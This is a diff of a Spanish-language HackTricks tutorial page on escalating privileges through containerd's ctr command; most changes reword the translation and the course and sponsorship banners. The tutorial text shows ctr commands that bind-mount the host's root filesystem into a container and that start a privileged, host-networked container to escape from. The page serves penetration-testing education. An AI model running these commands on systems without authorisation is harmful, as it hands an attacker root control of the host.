@@ -1,16 +1,16 @@
-# Escalada de privilegios de Containerd (ctr)
+# Escalación de Privilegios de Containerd (ctr)
 
 {% hint style="success" %}
-Aprende y practica Hacking en AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
 Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Apoya a HackTricks</summary>
 
-* ¡Consulta los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
+* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
 </details>
 {% endhint %}
@@ -25,7 +25,7 @@ Ve al siguiente enlace para aprender **qué es containerd** y `ctr`:
 
 ## PE 1
 
-si descubres que un host contiene el comando `ctr`:
+si encuentras que un host contiene el comando `ctr`:
 ```bash
 which ctr
 /usr/bin/ctr
@@ -43,28 +43,28 @@ ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:late
 ```
 ## PE 2
 
-Ejecute un contenedor con privilegios y escape de él.\
-Puede ejecutar un contenedor con privilegios de la siguiente manera:
+Ejecuta un contenedor privilegiado y escapa de él.\
+Puedes ejecutar un contenedor privilegiado como:
 ```bash
 ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
 ```
-Entonces puedes usar algunas de las técnicas mencionadas en la siguiente página para **escapar de ella abusando de las capacidades privilegiadas**:
+Entonces, puedes usar algunas de las técnicas mencionadas en la siguiente página para **escapar de ella abusando de capacidades privilegiadas**:
 
 {% content-ref url="docker-security/" %}
 [docker-security](docker-security/)
 {% endcontent-ref %}
 
 {% hint style="success" %}
-Aprende y practica Hacking en AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
 Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Apoya a HackTricks</summary>
 
-* Consulta los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
+* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
 </details>
 {% endhint %}
